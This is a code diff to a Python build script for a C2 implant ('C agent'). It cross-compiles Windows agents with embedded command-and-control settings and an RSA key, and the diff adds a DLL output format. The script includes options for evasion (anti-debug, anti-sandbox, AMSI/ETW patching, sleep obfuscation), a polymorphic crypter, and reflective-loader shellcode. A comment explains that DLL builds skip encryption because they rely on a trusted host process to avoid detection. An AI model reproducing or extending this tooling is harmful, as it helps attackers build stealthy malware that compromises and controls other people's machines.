@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Build script for generating a configured C agent .exe via MinGW cross-compilation.
+Build script for generating a configured C agent .exe or .dll via MinGW cross-compilation.
 
 Generates a config.h with embedded C2 settings and RSA public key,
 then invokes x86_64-w64-mingw32-gcc to produce the agent binary.
@@ -12,8 +12,14 @@ Usage (standalone):
     --sleep 60 --jitter 25 \
     --output builds/agent.exe
 
+  python build_agent_c.py \
+    --listener-url https://c2.example.com/api/v1 \
+    --format dll \
+    --output builds/agent.dll
+
 Usage (from operator shell):
   generate --url https://... --sleep 60 --jitter 25
+  generate --url https://... --sleep 10 --format dll
 """
 
 import argparse
@@ -223,10 +229,11 @@ def build_agent(
     target_os: str = "win10",
     debug: bool = False,
     no_crypt: bool = False,
+    format: str = "exe",
 ) -> Path:
     """
     Build a configured C agent.
-    Returns the path to the compiled .exe.
+    Returns the path to the compiled .exe or .dll.
     """
     agent_src = project_root / "agent_c"
 
@@ -342,8 +349,9 @@ def build_agent(
     )
 
     # Determine output path
+    ext = ".dll" if format == "dll" else ".exe"
     if not output_path:
-        output_path = project_root / "builds" / f"agent_{arch}.exe"
+        output_path = project_root / "builds" / f"agent_{arch}{ext}"
     output_path.parent.mkdir(parents=True, exist_ok=True)
 
     # Select compiler
@@ -398,9 +406,15 @@ END
         if wr_result.returncode == 0:
             res_obj = res_obj_path
 
-    # Compile (exclude reflective_loader.c — it's compiled separately to shellcode)
+    # Compile — exclude reflective_loader.c (compiled separately to shellcode)
+    # For EXE builds, also exclude dll_entry.c (DLL-only entry point)
+    exclude_src = {"reflective_loader.c"}
+    if format == "exe":
+        exclude_src.add("dll_entry.c")
+
     src_files = [f for f in (build_dir / "src").glob("*.c")
-                 if f.name != "reflective_loader.c"]
+                 if f.name not in exclude_src]
+
     cmd = [
         cc,
         f"-I{build_dir / 'include'}",
@@ -420,10 +434,23 @@ END
         "-ldnsapi", "-lole32", "-loleaut32", "-liphlpapi", "-lws2_32",
         "-lgdi32", "-luser32",
         "-static-libgcc",
-        "-Wl,--subsystem,windows",
-        "-Wl,--gc-sections",
-        "-Wl,-e,main",
     ]
+
+    # Format-specific linker flags
+    if format == "dll":
+        # DLL: use CRT entry (DllMainCRTStartup), shared library, kill ordinal decoration
+        cmd += [
+            "-shared",
+            "-Wl,--gc-sections",
+            "-Wl,--kill-at",
+        ]
+    else:
+        # EXE: skip CRT, subsystem windows, custom entry
+        cmd += [
+            "-Wl,--subsystem,windows",
+            "-Wl,--gc-sections",
+            "-Wl,-e,main",
+        ]
 
     result = subprocess.run(cmd, capture_output=True, text=True)
     if result.returncode != 0:
@@ -435,7 +462,9 @@ END
     shutil.rmtree(build_dir, ignore_errors=True)
 
     # ─── Pass 2: Polymorphic encryption (wrap in stub loader) ───
-    if not no_crypt:
+    # Only for EXE format — DLL is loaded by a trusted process so on-disk
+    # evasion is handled by the host binary's reputation.
+    if format == "exe" and not no_crypt:
         # pe_crypt.py lives in scripts/ alongside this file
         _scripts_dir = str(Path(__file__).parent)
         if _scripts_dir not in sys.path:
@@ -464,6 +493,8 @@ END
                 if payload_path.exists():
                     payload_path.rename(raw_path)
                     print(f"[*] Raw agent (spawn payload): {raw_path}")
+    elif format == "dll":
+        print("[*] DLL format — skipping crypter (loaded via trusted process)")
 
     return output_path
 
@@ -478,6 +509,8 @@ def parse_args():
     p.add_argument("--kill-date", default="", help="Kill date (YYYY-MM-DD)")
     p.add_argument("--magic", default="0xDEADF00D")
     p.add_argument("--arch", choices=["x64", "x86"], default="x64")
+    p.add_argument("--format", choices=["exe", "dll"], default="exe",
+                   help="Output format: exe (default) or dll")
     p.add_argument("--output", type=Path, default=None)
     p.add_argument("--no-evasion", action="store_true",
                    help="Disable all evasion (anti-debug, anti-sandbox, AMSI/ETW patches, sleep obf)")
@@ -521,7 +554,7 @@ def main():
             rsa_path = default_rsa
 
     try:
-        exe_path = build_agent(
+        out_path = build_agent(
             project_root,
             listener_url=args.listener_url,
             rsa_pubkey_path=rsa_path,
@@ -545,9 +578,10 @@ def main():
             target_os=args.target_os,
             debug=args.debug,
             no_crypt=args.no_crypt,
+            format=args.format,
         )
-        size_kb = exe_path.stat().st_size / 1024
-        print(f"[+] Agent built: {exe_path} ({size_kb:.1f} KB)")
+        size_kb = out_path.stat().st_size / 1024
+        print(f"[+] Agent built: {out_path} ({size_kb:.1f} KB)")
     except FileNotFoundError as e:
         print(f"[!] {e}")
         sys.exit(1)
